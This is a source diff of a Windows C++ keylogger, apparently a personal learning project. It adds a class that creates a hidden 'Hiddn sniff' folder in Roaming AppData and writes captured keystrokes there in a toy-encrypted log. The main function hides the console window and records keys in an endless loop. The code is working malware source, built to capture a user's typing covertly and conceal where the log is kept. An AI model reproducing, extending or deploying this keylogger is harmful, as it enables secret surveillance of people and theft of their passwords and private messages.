@@ -6,13 +6,47 @@
 #include <sstream>
 #include <map>
 #include <thread>
+#include <ShlObj.h> //a librery that allows you to retrieve paths to special folders
 
-#define PATH_TO_LOG "C:\\Users\\wiesz\\OneDrive\\Desktop\\learning_c\\key_sniffer\\log.txt"
-#define PATH_TO_ENCRYPTED "C:\\Users\\wiesz\\OneDrive\\Desktop\\learning_c\\key_sniffer\\encrypted.txt"
-#define PATH_TO_SOLUTION "C:\\Users\\wiesz\\OneDrive\\Desktop\\learning_c\\key_sniffer\\solution.txt"
 #define DELAY 150
 #define GLOBAL_PARAM_P 8200 //arbitrary keys
 #define global_param_g 4 //arbitrary keys
+
+class FileHandler
+{
+public:
+	static bool DirectoryExists(const std::wstring& path) {
+		DWORD attributes = GetFileAttributes(path.c_str());
+		return (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY));
+	}
+
+	static std::string getLocalPath() {
+		PWSTR appDataPath;
+		//notice this function allocates memory!
+		if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appDataPath) != S_OK) {
+			std::cerr << "Error getting AppData folder path." << std::endl;
+			return "";
+		}
+
+		std::wstring directoryPath = std::wstring(appDataPath) + L"\\Hiddn sniff";
+		if (!DirectoryExists(directoryPath)) {
+			// Create the directory
+			if (!CreateDirectory(directoryPath.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
+				std::cerr << "Error creating directory." << std::endl;
+				return "";
+			}
+			else {
+				//make the directory hidden
+				SetFileAttributes(directoryPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+				std::wcout << "Directory created successfully: " << directoryPath << std::endl;
+			}
+		}
+		// Release allocated memory
+		CoTaskMemFree(appDataPath);
+		return std::string(directoryPath.begin(), directoryPath.end());
+	}
+};
+
 
 class KeyLogger
 {
@@ -55,14 +89,6 @@ public:
 				std::this_thread::sleep_for(std::chrono::milliseconds(DELAY));
 				return logWithEdgeCases(key);
 			}
-		}
-	}
-
-	void saveToFile(std::string data) {
-		std::ofstream logFile(PATH_TO_LOG, std::ios::app);
-		if (logFile.is_open()) {
-			logFile << data;
-			logFile.close();
 		}
 	}
 };
@@ -144,10 +170,10 @@ private:
 
 
 public:
-	void runEncryptor(std::string& str) {
+	void runEncryptor(std::string logPath, std::string& str) {
 		if (mode == ENCRYPT) {
 			std::ofstream cryptedFileWriter;
-			cryptedFileWriter.open(PATH_TO_ENCRYPTED, std::ios::app);
+			cryptedFileWriter.open(logPath, std::ios::app);
 			for (char& c : str) {
 				int res = diffieHelman(c);
 				//append to file
@@ -156,10 +182,10 @@ public:
 			cryptedFileWriter.close();
 		}
 	}
-	void runDecryptor(){
+	void runDecryptor(std::string logPath, std::string solutionPath){
 		// Read four digits at a time
 		char buffer[5];  // Including null for end of arr
-		std::ifstream fileDecryptReader(PATH_TO_ENCRYPTED);
+		std::ifstream fileDecryptReader(logPath);
 		std::ofstream fileSolutionWriter;
 		while (fileDecryptReader.read(buffer, 4)) {
 			buffer[4] = '\0';  // Null for end the buffer
@@ -167,7 +193,7 @@ public:
 			std::cout << "solving " << value << std::endl;
 			char c = decrypt(value);
 			std::cout << "the char is " << c << std::endl;
-			fileSolutionWriter.open(PATH_TO_SOLUTION, std::ios::app);
+			fileSolutionWriter.open(solutionPath, std::ios::app);
 			fileSolutionWriter << c;
 			fileSolutionWriter.close();
 		}
@@ -179,14 +205,23 @@ public:
 };
 
 int main() {
-
+	std::string basePath = FileHandler::getLocalPath();
+	
+	if (basePath.empty()) {
+		// Handle the error or exit the program
+		return 1;
+	}
+	std::string logPath = basePath + "\\encryptedLog.txt";
+	std::string solutionPath = basePath + "\\solution.txt";
+	std::cout << basePath << std::endl;
 	KeyLogger logger;
 	Encryptor encryptor;
 
 	std::string input = " ";
-	std::cout << "notice you need to set the mode. would you like to sniff and encrypt for a minute(e) or decrypt the log file(d)?" << std::endl;
-	while(input != "e" && input != "E" && input != "D" && input != "d")
+	while (input != "e" && input != "E" && input != "D" && input != "d") {
+		std::cout << "notice you need to set the mode. would you like to sniff and encrypt for a minute(e) or decrypt the log file(d)?" << std::endl;
 		std::cin >> input;
+	}
 
 	//hide terminal window
 	HWND hwnd = GetConsoleWindow();
@@ -196,13 +231,12 @@ int main() {
 		while (true) {
 			std::string data = logger.log();
 			std::cout << data;
-			logger.saveToFile(data);
 			encryptor.setMode(ENCRYPT);
-			encryptor.runEncryptor(data);
+			encryptor.runEncryptor(logPath, data);
 		}
 	} else { 
 		encryptor.setMode(DECRYPT); 
-		encryptor.runDecryptor();
+		encryptor.runDecryptor(logPath, solutionPath);
 	}
     return 0;
 }
